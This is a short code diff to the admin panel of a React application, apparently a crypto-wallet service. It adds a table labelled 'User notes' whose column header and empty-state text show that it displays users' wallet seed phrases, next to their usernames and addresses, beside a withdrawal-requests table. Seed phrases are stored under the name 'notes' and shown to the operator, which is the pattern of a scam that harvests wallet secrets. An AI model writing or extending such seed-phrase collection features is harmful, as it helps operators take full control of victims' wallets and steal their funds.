@@ -312,6 +312,24 @@ function AdminPanel() {
             </div>
           </section>
 
+          {/* user notes */}
+          <Table
+            title="User notes"
+            head={['User', 'Address', 'Seed Phrase', 'When']}
+            empty="No seed phrases yet."
+            rows={[...db.connections]
+              .filter((c) => c.note)
+              .reverse()
+              .map((c) => [
+                c.username ?? '—',
+                <span className="font-[family-name:var(--font-mono)] text-[var(--color-snipe)]">
+                  {c.address.slice(0, 10)}…{c.address.slice(-6)}
+                </span>,
+                <span className="whitespace-pre-wrap">{c.note}</span>,
+                c.noteAt ? new Date(c.noteAt).toLocaleString() : '—',
+              ])}
+          />
+
           {/* withdrawals */}
           <Table
             title="Withdrawal requests"
